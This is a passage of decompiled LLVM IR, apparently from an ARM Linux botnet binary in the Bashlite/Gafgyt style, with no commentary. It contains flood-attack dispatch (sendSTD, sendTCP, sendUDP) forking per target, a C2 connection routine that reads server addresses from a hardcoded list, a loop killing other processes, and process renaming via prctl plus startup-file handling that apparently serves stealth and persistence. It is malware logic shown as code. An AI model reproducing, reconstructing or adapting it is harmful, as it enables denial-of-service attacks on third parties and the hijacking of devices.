dec_label_pc_dec4:                                ; preds = %dec_label_pc_dea4
  %v1_dec8 = add i32 %tmp, 12
  %v1_decc = inttoptr i32 %v1_dec8 to i32*
  %v2_decc = load i32, i32* %v1_decc, align 4
  store i32 %v2_decc, i32* @r0, align 4
  %v1_ded4 = call i32 @atol(i32 %v2_decc)
  %v5_dee0 = icmp sgt i32 %v1_ded4, 0
  br i1 %v5_dee0, label %dec_label_pc_defc, label %dec_label_pc_dee4

dec_label_pc_dee4:                                ; preds = %dec_label_pc_dec4, %dec_label_pc_dea4, %dec_label_pc_de98
  %v2_dee8 = load i32, i32* @global_var_23b28.49, align 4
  %v3_def4 = call i32 @Rootsprintf(i32 %v2_dee8, i32 ptrtoint ([27 x i8]* @global_var_19940.520 to i32))
  br label %dec_label_pc_e108

dec_label_pc_defc:                                ; preds = %dec_label_pc_dec4
  %v1_df00 = add i32 %tmp, 4
  %v1_df04 = inttoptr i32 %v1_df00 to i32*
  %v2_df04 = load i32, i32* %v1_df04, align 4
  %v2_df14 = load i32, i32* %v1_deac, align 4
  store i32 %v2_df14, i32* @r0, align 4
  %v1_df1c = call i32 @atol(i32 %v2_df14)
  %v2_df30 = load i32, i32* %v1_decc, align 4
  store i32 %v2_df30, i32* @r0, align 4
  %v1_df38 = call i32 @atol(i32 %v2_df30)
  %v2_df50 = call i32 @__GI_strchr(i32 %v2_df04, i32 44)
  %v2_df58 = icmp eq i32 %v2_df50, 0
  br i1 %v2_df58, label %dec_label_pc_dfc8, label %dec_label_pc_df60

dec_label_pc_df60:                                ; preds = %dec_label_pc_defc
  store i32 %v2_df04, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19780.477 to i32), i32* @r1, align 4
  %v2_df6c = call i32 @__GI_strtok(i32 %v2_df04, i32 ptrtoint (i32* @global_var_19780.477 to i32))
  %v2_dfbc24 = icmp eq i32 %v2_df6c, 0
  br i1 %v2_dfbc24, label %dec_label_pc_dff0, label %dec_label_pc_df7c

dec_label_pc_df7c:                                ; preds = %dec_label_pc_df60, %dec_label_pc_dfa4
  %storemerge1125 = phi i32 [ %v2_dfac, %dec_label_pc_dfa4 ], [ %v2_df6c, %dec_label_pc_df60 ]
  %v0_df7c = call i32 @listFork()
  %v2_df84 = icmp eq i32 %v0_df7c, 0
  br i1 %v2_df84, label %dec_label_pc_df8c, label %dec_label_pc_dfa4

dec_label_pc_df8c:                                ; preds = %dec_label_pc_df7c
  %v4_df98 = call i32 @sendSTD(i32 %storemerge1125, i32 %v1_df1c, i32 %v1_df38, i32 0)
  %v1_dfa0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_dfa4:                                ; preds = %dec_label_pc_df7c
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19780.477 to i32), i32* @r1, align 4
  %v2_dfac = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_19780.477 to i32))
  %v2_dfbc = icmp eq i32 %v2_dfac, 0
  br i1 %v2_dfbc, label %dec_label_pc_dff0, label %dec_label_pc_df7c

dec_label_pc_dfc8:                                ; preds = %dec_label_pc_defc
  %v0_dfc8 = call i32 @listFork()
  %v2_dfd0 = icmp eq i32 %v0_dfc8, 0
  br i1 %v2_dfd0, label %dec_label_pc_dfd8, label %dec_label_pc_e108

dec_label_pc_dfd8:                                ; preds = %dec_label_pc_dfc8
  %v4_dfe4 = call i32 @sendSTD(i32 %v2_df04, i32 %v1_df1c, i32 %v1_df38, i32 0)
  %v1_dfec = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_dff0:                                ; preds = %dec_label_pc_dfa4, %dec_label_pc_df60, %dec_label_pc_de78
  %v2_dff4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1995c.522 to i32), i32* @r1, align 4
  %v3_e000 = inttoptr i32 %v2_dff4 to i8*
  %v4_e000 = call i32 @__GI_strcoll(i8* %v3_e000, i32 ptrtoint ([5 x i8]* @global_var_1995c.522 to i32))
  %v2_e008 = icmp eq i32 %v4_e000, 0
  br i1 %v2_e008, label %dec_label_pc_e010, label %dec_label_pc_e108

dec_label_pc_e010:                                ; preds = %dec_label_pc_dff0
  br label %dec_label_pc_e0b4

dec_label_pc_e024:                                ; preds = %dec_label_pc_e0b4, %dec_label_pc_e0e8
  %v3_e028 = mul i32 %storemerge9, 4
  %v2_e034 = load i32, i32* @global_var_29db4.70, align 4
  %v2_e038 = add i32 %v2_e034, %v3_e028
  %v1_e03c = inttoptr i32 %v2_e038 to i32*
  %v2_e03c = load i32, i32* %v1_e03c, align 4
  %v2_e040 = icmp eq i32 %v2_e03c, 0
  br i1 %v2_e040, label %dec_label_pc_e0a8, label %dec_label_pc_e048

dec_label_pc_e048:                                ; preds = %dec_label_pc_e024
  %v2_e060 = load i32, i32* %v1_e03c, align 4
  store i32 %v2_e060, i32* @r4, align 4
  %v0_e064 = call i32 @__libc_getpid()
  %v0_e06c = load i32, i32* @r4, align 4
  %v9_e06c = icmp eq i32 %v0_e06c, %v0_e064
  br i1 %v9_e06c, label %dec_label_pc_e0a8, label %dec_label_pc_e074

dec_label_pc_e074:                                ; preds = %dec_label_pc_e048
  %v0_e098 = call i32 @kill()
  %v1_e0a0 = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_e0a8

dec_label_pc_e0a8:                                ; preds = %dec_label_pc_e048, %dec_label_pc_e024, %dec_label_pc_e074
  %v24_e10c34 = phi i32 [ %v24_e10c35, %dec_label_pc_e024 ], [ %v0_e064, %dec_label_pc_e048 ], [ %v0_e098, %dec_label_pc_e074 ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.1, %dec_label_pc_e024 ], [ %stack_var_-44.1, %dec_label_pc_e048 ], [ %v1_e0a0, %dec_label_pc_e074 ]
  %v1_e0ac = add i32 %storemerge9, 1
  br label %dec_label_pc_e0b4

dec_label_pc_e0b4:                                ; preds = %dec_label_pc_e010, %dec_label_pc_e0a8
  %v24_e10c35 = phi i32 [ 0, %dec_label_pc_e010 ], [ %v24_e10c34, %dec_label_pc_e0a8 ]
  %stack_var_-44.1 = phi i32 [ 0, %dec_label_pc_e010 ], [ %stack_var_-44.0, %dec_label_pc_e0a8 ]
  %storemerge9 = phi i32 [ 0, %dec_label_pc_e010 ], [ %v1_e0ac, %dec_label_pc_e0a8 ]
  %v5_e0cc = load i32, i32* @global_var_23b34.68, align 4
  %v9_e0e0 = icmp eq i32 %v5_e0cc, 0
  br i1 %v9_e0e0, label %dec_label_pc_e0e8, label %dec_label_pc_e024

dec_label_pc_e0e8:                                ; preds = %dec_label_pc_e0b4
  %v2_e0cc = load i32, i32* @global_var_23b30.67, align 4
  %tmp97 = icmp ugt i32 %v2_e0cc, %storemerge9
  br i1 %tmp97, label %dec_label_pc_e024, label %dec_label_pc_e108

dec_label_pc_e108:                                ; preds = %dec_label_pc_e0e8, %dec_label_pc_db24, %dec_label_pc_dabc, %dec_label_pc_d6cc, %dec_label_pc_dfc8, %dec_label_pc_dff0, %dec_label_pc_db48, %dec_label_pc_d6f0, %dec_label_pc_d618, %dec_label_pc_d6ac, %dec_label_pc_d6a0, %dec_label_pc_d5b0, %dec_label_pc_dee4, %dec_label_pc_dc98, %dec_label_pc_d954, %dec_label_pc_d650, %dec_label_pc_d554
  %v24_e10c = phi i32 [ %v1_d6dc, %dec_label_pc_d6cc ], [ %v0_dfc8, %dec_label_pc_dfc8 ], [ %v4_e000, %dec_label_pc_dff0 ], [ %v0_db48, %dec_label_pc_db48 ], [ %v0_d6f0, %dec_label_pc_d6f0 ], [ 0, %dec_label_pc_d618 ], [ %v1_d6bc, %dec_label_pc_d6ac ], [ 0, %dec_label_pc_d6a0 ], [ 0, %dec_label_pc_d5b0 ], [ %v3_def4, %dec_label_pc_dee4 ], [ %v3_dca8, %dec_label_pc_dc98 ], [ %v3_d964, %dec_label_pc_d954 ], [ %v0_d628, %dec_label_pc_d650 ], [ %v3_d564, %dec_label_pc_d554 ], [ 0, %dec_label_pc_dabc ], [ 0, %dec_label_pc_db24 ], [ %v24_e10c35, %dec_label_pc_e0e8 ]
  store i32 %v3_d520, i32* @r4, align 4
  store i32 %v6_d520, i32* @r5, align 4
  store i32 %v9_d520, i32* @r6, align 4
  store i32 %v12_d520, i32* @r7, align 4
  store i32 %v15_d520, i32* @r8, align 4
  store i32 %v18_d520, i32* @fp, align 4
  ret i32 %v24_e10c

; uselistorder directives
  uselistorder i32 %stack_var_-44.1, { 0, 2, 1 }
  uselistorder i32 %v2_dfac, { 1, 0 }
  uselistorder i32 %v1_df38, { 1, 0 }
  uselistorder i32 %v1_df1c, { 1, 0 }
  uselistorder i32 %v2_df04, { 2, 1, 0, 3 }
  uselistorder i32 %v2_de18, { 1, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v1_dd08, { 1, 0 }
  uselistorder i32 %v1_dcec, { 1, 0 }
  uselistorder i32 %v1_dcd0, { 1, 0 }
  uselistorder i32 %v2_dcb8, { 2, 1, 0, 3 }
  uselistorder i32 %v2_db2c, { 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32 %v1_d9c4, { 1, 0 }
  uselistorder i32 %v1_d9a8, { 1, 0 }
  uselistorder i32 %v1_d98c, { 1, 0 }
  uselistorder i32 %v2_d974, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 4, 1, 5, 6, 7, 8, 0, 9, 10, 11, 14, 13, 12, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_19780.477 to i32), { 1, 8, 2, 9, 0, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 1000, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_29db0.499, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_19438.51 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_e108, { 0, 5, 4, 12, 13, 6, 1, 2, 14, 7, 3, 9, 10, 15, 8, 11, 16 }
  uselistorder label %dec_label_pc_e0b4, { 1, 0 }
  uselistorder label %dec_label_pc_e0a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e024, { 1, 0 }
  uselistorder label %dec_label_pc_df7c, { 1, 0 }
  uselistorder label %dec_label_pc_de78, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_ddcc, { 1, 0 }
  uselistorder label %dec_label_pc_dd8c, { 1, 0 }
  uselistorder label %dec_label_pc_dd54, { 1, 0 }
  uselistorder label %dec_label_pc_dcb0, { 1, 0 }
  uselistorder label %dec_label_pc_dad8, { 1, 0 }
  uselistorder label %dec_label_pc_da98, { 1, 0 }
  uselistorder label %dec_label_pc_da60, { 1, 0 }
  uselistorder label %dec_label_pc_da1c, { 1, 0 }
  uselistorder label %dec_label_pc_d96c, { 1, 0 }
  uselistorder label %dec_label_pc_d814, { 1, 0 }
  uselistorder label %dec_label_pc_d5f4, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_e164 = load i32, i32* @fp, align 4
  store i32 57708, i32* %stack_var_-4, align 4
  %v2_e168 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e168, i32* @fp, align 4
  %v2_e17c = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_e18c = bitcast i32* %stack_var_-4116 to i8*
  %v3_e18c = call i32 @__GI_memset(i8* %v2_e18c, i32 0)
  %v2_e194 = load i32, i32* @global_var_23b28.49, align 4
  %v2_e198 = icmp eq i32 %v2_e194, 0
  br i1 %v2_e198, label %dec_label_pc_e1bc, label %dec_label_pc_e1a0

dec_label_pc_e1a0:                                ; preds = %entry
  %v1_e1ac = call i32 @__libc_close(i32 %v2_e194)
  store i32 0, i32* @global_var_23b28.49, align 4
  br label %dec_label_pc_e1bc

dec_label_pc_e1bc:                                ; preds = %entry, %dec_label_pc_e1a0
  %v2_e1c0 = load i32, i32* @global_var_23700.527, align 4
  %v2_e1c4 = icmp eq i32 %v2_e1c0, 0
  br i1 %v2_e1c4, label %dec_label_pc_e1f0, label %dec_label_pc_e1dc

dec_label_pc_e1dc:                                ; preds = %dec_label_pc_e1bc
  %v1_e1e4 = add i32 %v2_e1c0, 1
  br label %dec_label_pc_e1f0

dec_label_pc_e1f0:                                ; preds = %dec_label_pc_e1bc, %dec_label_pc_e1dc
  %storemerge1 = phi i32 [ %v1_e1e4, %dec_label_pc_e1dc ], [ 0, %dec_label_pc_e1bc ]
  store i32 %storemerge1, i32* @global_var_23700.527, align 4
  %v4_e208 = mul i32 %storemerge1, 4
  %v5_e208 = add i32 %v4_e208, ptrtoint ([20 x i8]** @global_var_2319c.529 to i32)
  %v6_e208 = inttoptr i32 %v5_e208 to i32*
  %v7_e208 = load i32, i32* %v6_e208, align 4
  %v2_e214 = inttoptr i32 %v7_e208 to i8*
  %v3_e214 = call i32 @strcpy(i32 %v2_e17c, i8* %v2_e214)
  %v2_e234 = call i32 @__GI_strchr(i32 %v2_e17c, i32 58)
  %v2_e23c = icmp eq i32 %v2_e234, 0
  br i1 %v2_e23c, label %dec_label_pc_e29c, label %dec_label_pc_e244

dec_label_pc_e244:                                ; preds = %dec_label_pc_e1f0
  %v2_e258 = call i32 @__GI_strchr(i32 %v2_e17c, i32 58)
  %v1_e260 = add i32 %v2_e258, 1
  store i32 %v1_e260, i32* @r0, align 4
  %v1_e268 = call i32 @atol(i32 %v1_e260)
  %v2_e288 = call i32 @__GI_strchr(i32 %v2_e17c, i32 58)
  %v3_e298 = inttoptr i32 %v2_e288 to i8*
  store i8 0, i8* %v3_e298, align 1
  br label %dec_label_pc_e29c

dec_label_pc_e29c:                                ; preds = %dec_label_pc_e1f0, %dec_label_pc_e244
  %stack_var_-20.0 = phi i32 [ 123, %dec_label_pc_e1f0 ], [ %v1_e268, %dec_label_pc_e244 ]
  %v0_e2a8 = call i32 @socket()
  store i32 %v0_e2a8, i32* @global_var_23b28.49, align 4
  %v4_e2dc = call i32 @connectTimeout(i32 %v0_e2a8, i32 %v2_e17c, i32 %stack_var_-20.0, i32 30)
  %v2_e2e4 = icmp eq i32 %v4_e2dc, 0
  %. = zext i1 %v2_e2e4 to i32
  store i32 %v3_e164, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_e17c, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @atol, { 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e29c, { 1, 0 }
  uselistorder label %dec_label_pc_e1f0, { 1, 0 }
  uselistorder label %dec_label_pc_e1bc, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e32c = load i32, i32* @fp, align 4
  store i32 %v3_e32c, i32* %stack_var_-16, align 4
  %v0_e348 = call i32 @socket()
  %v3_e358 = icmp eq i32 %v0_e348, -1
  br i1 %v3_e358, label %dec_label_pc_e360, label %dec_label_pc_e370

dec_label_pc_e360:                                ; preds = %entry
  br label %dec_label_pc_e5d8

dec_label_pc_e370:                                ; preds = %entry
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19964.531 to i32), i32* @r0, align 4
  %v2_e3b4 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_19964.531 to i32))
  %v1_e3c4 = call i32 @htons(i32 53)
  %v3_e3e8 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v4_e3e8 = call i32 @__libc_connect(i32 %v0_e348, %sockaddr* %v3_e3e8, i32 16)
  %v3_e3f8 = icmp eq i32 %v4_e3e8, -1
  br i1 %v3_e3f8, label %dec_label_pc_e400, label %dec_label_pc_e410

dec_label_pc_e400:                                ; preds = %dec_label_pc_e370
  br label %dec_label_pc_e5d8

dec_label_pc_e410:                                ; preds = %dec_label_pc_e370
  store i32 16, i32* %stack_var_-72, align 4
  %v2_e418 = ptrtoint i32* %stack_var_-68 to i32
  %v2_e41c = ptrtoint i32* %stack_var_-72 to i32
  %v5_e428 = bitcast i32* %stack_var_-68 to %sockaddr*
  %v6_e428 = call i32 @__GI_getsockname(i32 %v0_e348, %sockaddr* %v5_e428, i32 %v2_e41c, i32 %v2_e418, i32 16)
  %v3_e438 = icmp eq i32 %v6_e428, -1
  br i1 %v3_e438, label %dec_label_pc_e440, label %dec_label_pc_e450

dec_label_pc_e440:                                ; preds = %dec_label_pc_e410
  br label %dec_label_pc_e5d8

dec_label_pc_e450:                                ; preds = %dec_label_pc_e410
  store i32 ptrtoint (i32* @global_var_29da8.81 to i32), i32* @r2, align 4
  %v4_e464 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1996c.534, i32 0, i32 0), i32 0)
  %v2_e4fc = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_e4f4

dec_label_pc_e474:                                ; preds = %dec_label_pc_e4f4
  %v8_e488 = call i32 @strstr(i32 %v2_e4fc, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1997c.536, i32 0, i32 0), i32 %v4_e464, i32 %v2_e4fc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v2_e490 = icmp eq i32 %v8_e488, 0
  br i1 %v2_e490, label %dec_label_pc_e4d8, label %dec_label_pc_e4b8.preheader

dec_label_pc_e4b8.preheader:                      ; preds = %dec_label_pc_e474
  %v2_e4bc9 = load i8, i8* %stack_var_-4168, align 1
  %v7_e4c013 = icmp eq i8 %v2_e4bc9, 9
  br i1 %v7_e4c013, label %dec_label_pc_e4c8, label %dec_label_pc_e4ac

dec_label_pc_e4ac:                                ; preds = %dec_label_pc_e4b8.preheader, %dec_label_pc_e4ac
  %v4_e4b814 = phi i32 [ %v1_e4b0, %dec_label_pc_e4ac ], [ %v2_e4fc, %dec_label_pc_e4b8.preheader ]
  %v1_e4b0 = add i32 %v4_e4b814, 1
  %v5_e4b4 = inttoptr i32 %v1_e4b0 to i8*
  %v2_e4bc = load i8, i8* %v5_e4b4, align 1
  %v7_e4c0 = icmp eq i8 %v2_e4bc, 9
  br i1 %v7_e4c0, label %dec_label_pc_e4c8, label %dec_label_pc_e4ac

dec_label_pc_e4c8:                                ; preds = %dec_label_pc_e4ac, %dec_label_pc_e4b8.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_e4b8.preheader ], [ %v5_e4b4, %dec_label_pc_e4ac ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_e51c

dec_label_pc_e4d8:                                ; preds = %dec_label_pc_e474
  store i32 4096, i32* @r2, align 4
  %v3_e4f0 = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_e4f4

dec_label_pc_e4f4:                                ; preds = %dec_label_pc_e450, %dec_label_pc_e4d8
  %v4_e50c = call i32 @fdgets(i32 %v2_e4fc, i32 4096, i32 %v4_e464, i32 %v2_e4fc)
  %v2_e514 = icmp eq i32 %v4_e50c, 0
  br i1 %v2_e514, label %dec_label_pc_e51c, label %dec_label_pc_e474

dec_label_pc_e51c:                                ; preds = %dec_label_pc_e4f4, %dec_label_pc_e4c8
  %v1_e520 = call i32 @__libc_close(i32 %v4_e464)
  %v4_e530 = load i8, i8* %stack_var_-4168, align 1
  %v2_e534 = icmp eq i8 %v4_e530, 0
  br i1 %v2_e534, label %dec_label_pc_e5cc, label %dec_label_pc_e53c

dec_label_pc_e53c:                                ; preds = %dec_label_pc_e51c
  %v2_e544 = ptrtoint i32* %stack_var_-4200 to i32
  %v3_e55c = call i32 @strcpy(i32 %v2_e544, i8* nonnull %stack_var_-4168)
  %v3_e57c = call i32 @ioctl(i32 %v0_e348, i32 35111, i32 %v2_e544)
  %v2_e59c = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_e58c

dec_label_pc_e58c:                                ; preds = %dec_label_pc_e53c, %dec_label_pc_e58c
  %storemerge47 = phi i32 [ 0, %dec_label_pc_e53c ], [ %v1_e5b8, %dec_label_pc_e58c ]
  %v2_e5a4 = add i32 %storemerge47, %v2_e59c
  %v1_e5a8 = inttoptr i32 %v2_e5a4 to i8*
  %v2_e5a8 = load i8, i8* %v1_e5a8, align 1
  %v4_e5b0 = add i32 %storemerge47, ptrtoint (i32* @global_var_23b38.538 to i32)
  %v5_e5b0 = inttoptr i32 %v4_e5b0 to i8*
  store i8 %v2_e5a8, i8* %v5_e5b0, align 1
  %v1_e5b8 = add nuw nsw i32 %storemerge47, 1
  %v7_e5c8 = icmp slt i32 %v1_e5b8, 6
  br i1 %v7_e5c8, label %dec_label_pc_e58c, label %dec_label_pc_e5cc

dec_label_pc_e5cc:                                ; preds = %dec_label_pc_e58c, %dec_label_pc_e51c
  %v1_e5d0 = call i32 @__libc_close(i32 %v0_e348)
  %v3_e5ec.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_e5e8

dec_label_pc_e5d8:                                ; preds = %dec_label_pc_e440, %dec_label_pc_e400, %dec_label_pc_e360
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_e5e8

dec_label_pc_e5e8:                                ; preds = %dec_label_pc_e5cc, %dec_label_pc_e5d8
  %v3_e5ec = phi i32 [ %v3_e5ec.pre, %dec_label_pc_e5cc ], [ 0, %dec_label_pc_e5d8 ]
  %v2_e5f4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e5f4, i32* @fp, align 4
  ret i32 %v3_e5ec

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_e4b0, { 1, 0 }
  uselistorder i32 %v2_e4fc, { 1, 4, 0, 3, 2 }
  uselistorder i32 %v0_e348, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 3, 5, 2, 0, 1, 4 }
  uselistorder i32 (i32)* @htons, { 3, 10, 9, 8, 7, 6, 5, 11, 4, 2, 1, 0 }
  uselistorder label %dec_label_pc_e5e8, { 1, 0 }
  uselistorder label %dec_label_pc_e58c, { 1, 0 }
  uselistorder label %dec_label_pc_e4f4, { 1, 0 }
  uselistorder label %dec_label_pc_e4ac, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([10 x i8]* @global_var_19988.540 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_e62c = load i32, i32* @r4, align 4
  store i32 %v3_e62c, i32* %stack_var_-24, align 4
  store i32 58932, i32* %stack_var_-4, align 4
  %v19_e62c = ptrtoint i32* %stack_var_-24 to i32
  %v2_e630 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e630, i32* @fp, align 4
  %v1_e674 = bitcast i8** %argv to i32*
  %v2_e674 = load i32, i32* %v1_e674, align 4
  store i32 %v2_e674, i32* @r4, align 4
  %v2_e68c = load i32, i32* %v1_e674, align 4
  %v1_e690 = inttoptr i32 %v2_e68c to i8*
  %v3_e694 = call i32 @strlen(i8* %v1_e690)
  %v0_e69c = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_19994.542 to i32), i32* @r1, align 4
  %v3_e6a8 = call i32 @strncpy(i32 %v0_e69c, i32 ptrtoint (i32* @global_var_19994.542 to i32), i32 %v3_e694)
  store i32 ptrtoint (i32* @global_var_19994.542 to i32), i32* %v1_e674, align 4
  %v0_e6e4 = call i32 @prctl()
  %v2_e6ec = call i32 @__GI_time(i32* null)
  store i32 %v2_e6ec, i32* @r4, align 4
  %v0_e6f4 = call i32 @__libc_getpid()
  %v0_e6fc = load i32, i32* @r4, align 4
  %v2_e6fc = xor i32 %v0_e6fc, %v0_e6f4
  %v1_e704 = call i32 @srand(i32 %v2_e6fc)
  %v2_e70c = call i32 @__GI_time(i32* null)
  store i32 %v2_e70c, i32* @r4, align 4
  %v0_e714 = call i32 @__libc_getpid()
  %v0_e71c = load i32, i32* @r4, align 4
  %v2_e71c = xor i32 %v0_e71c, %v0_e714
  %v1_e724 = call i32 @init_rand(i32 %v2_e71c)
  store i32 ptrtoint ([19 x i8]* @global_var_19998.544 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_199ac.546 to i32), i32* @r1, align 4
  %v3_e740 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_19998.544 to i32), i32 ptrtoint ([2 x i8]* @global_var_199ac.546 to i32))
  %v2_e750 = icmp eq i32 %v3_e740, 0
  br i1 %v2_e750, label %dec_label_pc_e758, label %dec_label_pc_e774

dec_label_pc_e758:                                ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_199b0.548 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_199ac.546 to i32), i32* @r1, align 4
  %v3_e768 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_199b0.548 to i32), i32 ptrtoint ([2 x i8]* @global_var_199ac.546 to i32))
  br label %dec_label_pc_e774

dec_label_pc_e774:                                ; preds = %entry, %dec_label_pc_e758
  %stack_var_-88.0 = phi i32 [ %v3_e768, %dec_label_pc_e758 ], [ %v3_e740, %entry ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_199b0.548, i32 0, i32 0), %dec_label_pc_e758 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_19998.544, i32 0, i32 0), %entry ]
  %v2_e778 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v2_e778, label %dec_label_pc_e910, label %dec_label_pc_e780

dec_label_pc_e780:                                ; preds = %dec_label_pc_e774
  %v2_e790 = load i32, i32* %v1_e674, align 4
  %v1_e794 = inttoptr i32 %v2_e790 to i8*
  %v3_e798 = call i32 @strlen(i8* %v1_e794)
  %v2_e7ac = ptrtoint i32* %stack_var_-368 to i32
  %v2_e7b8 = call i32 @getcwd(i32 %v2_e7ac, i32 256)
  store i32 ptrtoint (i32* @global_var_199c0.550 to i32), i32* @r1, align 4
  %v2_e7c8 = bitcast i32* %stack_var_-368 to i8*
  %v3_e7c8 = call i32 @__GI_strcoll(i8* %v2_e7c8, i32 ptrtoint (i32* @global_var_199c0.550 to i32))
  %v2_e7d0 = icmp eq i32 %v3_e7c8, 0
  br i1 %v2_e7d0, label %dec_label_pc_e908, label %dec_label_pc_e7e8

dec_label_pc_e7dc:                                ; preds = %dec_label_pc_e7e8
  %v1_e7e0 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_e7e8

dec_label_pc_e7e8:                                ; preds = %dec_label_pc_e780, %dec_label_pc_e7dc
  %stack_var_-84.0 = phi i32 [ %v1_e7e0, %dec_label_pc_e7dc ], [ %v3_e798, %dec_label_pc_e780 ]
  %v2_e7f8 = load i32, i32* %v1_e674, align 4
  %v2_e800 = add i32 %v2_e7f8, %stack_var_-84.0
  %v1_e804 = inttoptr i32 %v2_e800 to i8*
  %v2_e804 = load i8, i8* %v1_e804, align 1
  %v7_e808 = icmp eq i8 %v2_e804, 47
  br i1 %v7_e808, label %dec_label_pc_e810, label %dec_label_pc_e7dc

dec_label_pc_e810:                                ; preds = %dec_label_pc_e7e8
  %v2_e820 = load i32, i32* %v1_e674, align 4
  %v2_e828 = add i32 %v2_e820, %stack_var_-84.0
  %v2_e82c = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_e82c, i32* @r0, align 4
  %v7_e840 = call i32 @sprintf(i32 %v2_e82c, i32 ptrtoint ([8 x i8]* @global_var_199c4.552 to i32), i32 %v2_e7ac, i32 %v2_e828, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_e89c = inttoptr i32 %stack_var_-88.0 to i8*
  %v2_e850 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_e87c = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_e898.outer

dec_label_pc_e848:                                ; preds = %dec_label_pc_e898
  %v3_e860 = call i32 @fgets(i32 %v2_e850, i32 1024, i32 %stack_var_-88.0)
  %v3_e87c = call i32 @__GI_strcasecmp(i8* %v2_e87c, i32 %v2_e82c)
